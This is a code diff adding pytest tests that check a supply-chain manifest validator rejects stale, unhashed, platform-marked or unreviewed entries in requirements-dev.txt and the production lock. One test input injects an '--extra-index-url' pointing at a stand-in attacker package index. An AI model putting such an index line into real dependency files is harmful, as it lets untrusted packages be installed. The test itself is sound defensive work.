@@ -28,6 +28,7 @@ def _copy_contract(tmp_path: Path) -> Path:
         "compose.yaml",
         "requirements.txt",
         "requirements.lock",
+        "requirements-dev.txt",
         "deploy/supply_chain.lock",
         "deploy/egress-proxy/Dockerfile",
     ):
@@ -76,6 +77,104 @@ def test_supply_chain_manifest_fails_closed_on_stale_or_unhashed_inputs(tmp_path
     lock_digest = hashlib.sha256(lock.read_bytes()).hexdigest()
     _replace_manifest_value(root, "requirements_lock_sha256", f"requirements_lock_sha256={lock_digest}")
     with pytest.raises(module.SupplyChainError, match="fully pinned and hashed"):
+        module.validate(root)
+
+
+def test_supply_chain_manifest_binds_fully_hashed_development_requirements(tmp_path):
+    module = _module()
+    root = _copy_contract(tmp_path)
+    dev = root / "requirements-dev.txt"
+    dev.write_text(
+        dev.read_text(encoding="utf-8").replace(
+            "pytest==9.1.1 \\\n", "pytest==9.1.1\n", 1
+        ),
+        encoding="utf-8",
+    )
+    digest = hashlib.sha256(dev.read_bytes()).hexdigest()
+    _replace_manifest_value(
+        root, "requirements_dev_sha256", f"requirements_dev_sha256={digest}"
+    )
+
+    with pytest.raises(module.SupplyChainError, match="fully pinned and hashed"):
+        module.validate(root)
+
+
+def test_supply_chain_manifest_rejects_platform_markers_in_production_lock(tmp_path):
+    module = _module()
+    root = _copy_contract(tmp_path)
+    lock = root / "requirements.lock"
+    lock.write_text(
+        lock.read_text(encoding="utf-8").replace(
+            "amqp==5.3.1 \\\n",
+            'amqp==5.3.1; sys_platform == "win32" \\\n',
+            1,
+        ),
+        encoding="utf-8",
+    )
+    digest = hashlib.sha256(lock.read_bytes()).hexdigest()
+    _replace_manifest_value(
+        root, "requirements_lock_sha256", f"requirements_lock_sha256={digest}"
+    )
+
+    with pytest.raises(module.SupplyChainError):
+        module.validate(root)
+
+
+def test_supply_chain_manifest_rejects_non_colorama_development_markers(tmp_path):
+    module = _module()
+    root = _copy_contract(tmp_path)
+    dev = root / "requirements-dev.txt"
+    dev.write_text(
+        dev.read_text(encoding="utf-8").replace(
+            "pytest==9.1.1 \\\n",
+            'pytest==9.1.1; sys_platform == "win32" \\\n',
+            1,
+        ),
+        encoding="utf-8",
+    )
+    digest = hashlib.sha256(dev.read_bytes()).hexdigest()
+    _replace_manifest_value(
+        root, "requirements_dev_sha256", f"requirements_dev_sha256={digest}"
+    )
+
+    with pytest.raises(module.SupplyChainError):
+        module.validate(root)
+
+
+@pytest.mark.parametrize(
+    "replacement",
+    [
+        "-r requirements.txt",
+        "-r requirements.lock\n-r requirements.lock",
+        "--extra-index-url https://attacker.invalid/simple",
+        'colorama==0.4.6; sys_platform != "win32" \\\n'
+        "    --hash=sha256:4f1d9991f5acc0ca119f9d443620b77f9d6b33703e51011c16baf57afb285fc6",
+    ],
+)
+def test_supply_chain_manifest_rejects_unreviewed_development_requirement_syntax(
+    tmp_path, replacement
+):
+    module = _module()
+    root = _copy_contract(tmp_path)
+    dev = root / "requirements-dev.txt"
+    source = dev.read_text(encoding="utf-8")
+    if replacement.startswith("colorama"):
+        source = re.sub(
+            r'colorama==0\.4\.6; sys_platform == "win32" \\\n'
+            r"    --hash=sha256:[0-9a-f]{64}",
+            replacement,
+            source,
+            count=1,
+        )
+    else:
+        source = source.replace("-r requirements.lock", replacement, 1)
+    dev.write_text(source, encoding="utf-8")
+    digest = hashlib.sha256(dev.read_bytes()).hexdigest()
+    _replace_manifest_value(
+        root, "requirements_dev_sha256", f"requirements_dev_sha256={digest}"
+    )
+
+    with pytest.raises(module.SupplyChainError):
         module.validate(root)
 
 
